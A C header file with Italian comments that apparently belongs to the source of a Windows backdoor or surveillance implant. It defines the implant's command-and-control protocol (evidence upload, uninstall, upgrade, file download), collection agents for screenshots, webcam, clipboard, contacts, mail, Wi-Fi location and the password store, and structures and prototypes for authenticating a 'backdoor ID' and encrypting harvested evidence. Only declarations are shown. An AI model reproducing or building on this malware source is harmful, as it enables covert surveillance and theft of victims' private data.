#include <windows.h>

#ifndef _PROTO_H
#define _PROTO_H
#pragma pack(1)

#define INVALID_COMMAND         (UINT)0x0       // Non usare
#define PROTO_OK                (UINT)0x1       // OK
#define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
#define PROTO_BYE               (UINT)0x3       // Chiusura di connessione
#define PROTO_NEW_CONF          (UINT)0x7       // Nuova configurazione
#define PROTO_EVIDENCE          (UINT)0x9       // Spedisce un evidence
#define PROTO_UNINSTALL         (UINT)0xa       // Disinstallazione
#define PROTO_EVIDENCE_SIZE     (UINT)0x0b		// 
#define PROTO_ID                (UINT)0xf       // Identificazione    
#define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
#define PROTO_FILESYSTEM        (UINT)0x19 
#define PROTO_DOWNLOAD          (UINT)0xc       // DOWNLOAD, restituisce la lista dei nomi(in WCHAR, NULL terminati)

#define BLOCK_LEN 16
#define PAD_NOPAD 0
#define PAD_PKCS5 1

#define PM_DEVICEINFO	0xfff1
#define PM_SCREENSHOT	0xfff2	
#define PM_IMAGENT_SOCIAL 0xC6C7	
#define PM_CONTACTSAGENT      0x0200
#define PM_CLIPBOARDAGENT     0xD9D9
#define PM_WIFILOCATION		  0x1220
#define PM_WEBCAMAGENT        0xE9E9
#define PM_PSTOREAGENT        0xFAFA
#define PM_MAILAGENT          0x1001  
#define PM_EXPLOREDIR         0xEDA1
#define PM_DOWNLOAD           0xD0D0  

#define LOG_VERSION	2008121901

typedef struct _LOG_HEADER
{
	ULONG uVersion;			// Versione della struttura
	ULONG uLogType;			// Tipo di log
	ULONG uHTimestamp;		// Parte alta del timestamp
	ULONG uLTimestamp;		// Parte bassa del timestamp
	ULONG uDeviceIdLen;		// IMEI/Hostname len
	ULONG uUserIdLen;		// IMSI/Username len
	ULONG uSourceIdLen;		// Numero del caller/IP len	
	ULONG uAdditionalData;	// Lunghezza della struttura addizionale, se presente
} LOG_HEADER, *PLOG_HEADER;


typedef struct _PASCAL_STRING
{
	DWORD dwStringLen;
	WCHAR lpStringBuff[1];
} PASCAL_STRING, *LPPASCAL_STRING;

__declspec(align(32))
typedef struct _PROTO_COMMAND_AUTH
{
	ULONG Version;
	BYTE Kd[16];
	BYTE Sha1[20];
	BYTE BdoorID[16];
	BYTE InstanceID[20];
	struct
	{
		BYTE Arch;		// windows 0
		BYTE Demo;		// demo 0, release 1 
		BYTE Stage;		// elite 1, soldier 2
		BYTE Flags;		// reserverd 0;
	} SubType;
} PROTO_COMMAND_AUTH, *LPPROTO_COMMAND_AUTH;



typedef struct _PROTO_RESPONSE_AUTH
{
	BYTE pRandomData[16];
	BYTE pSha1Digest[20];
	ULONG uProtoCommand;
	ULONG64 uTime;
} PROTO_RESPONSE_AUTH, *LPPROTO_RESPONSE_AUTH;

typedef struct _PROTO_RESPONSE_ID
{
	ULONG uProtoCommand;
	ULONG uMessageLen;
	ULONG64 uTime;
	ULONG uAvailables;
} PROTO_RESPONSE_ID, *LPPROTO_RESPONSE_ID;

typedef struct _PROTO_RESPONSE_UPGRADE
{
	ULONG uProtoCommand;
	ULONG uResponseLen;
	ULONG uUpgradeLeft;
	ULONG uUpgradeNameLen;
	WCHAR pUpgradeNameBuffer;
} PROTO_RESPONSE_UPGRADE, *LPPROTO_RESPONSE_UPGRADE;

PBYTE CreateLogHeader(__in ULONG uEvidenceType, __in PBYTE pAdditionalData, __in ULONG uAdditionalDataLen, __out PULONG uOutLen);
ULONG CommandHash(__in ULONG uProtoCmd, __in LPBYTE pMessage, __in ULONG uMessageLen, __in LPBYTE pEncryptionKey, __out LPBYTE *pOutBuff);
LPPASCAL_STRING PascalizeString(__in LPWSTR lpString, __in LPDWORD dwOutLen);
LPBYTE GetUserUniqueHash();
LPSTR ProtoMessageAuth();
BOOL Synch();
BOOL VerifyMessage(LPBYTE lpRandNonce, LPBYTE lpHash);
VOID CalculateSessionKey(LPBYTE lpRandomNonce);
LPBYTE DecodeMessage(LPBYTE lpMessage, DWORD dwMessageSize, BOOL bBase64, LPDWORD dwOut);
LPBYTE GetResponse(BOOL bBase64, LPDWORD dwOut);
BOOL ProtoAuth();
BOOL ProtoId();
LPBYTE ProtoMessageId(LPDWORD dwMsgLen);
LPBYTE PackEncryptEvidence(__in DWORD dwBufferSize, __in LPBYTE lpInBuffer, __in DWORD dwEvType, __in LPBYTE lpAdditionalData, __in DWORD dwAdditionalDataLen, __out LPDWORD dwOut);


#endif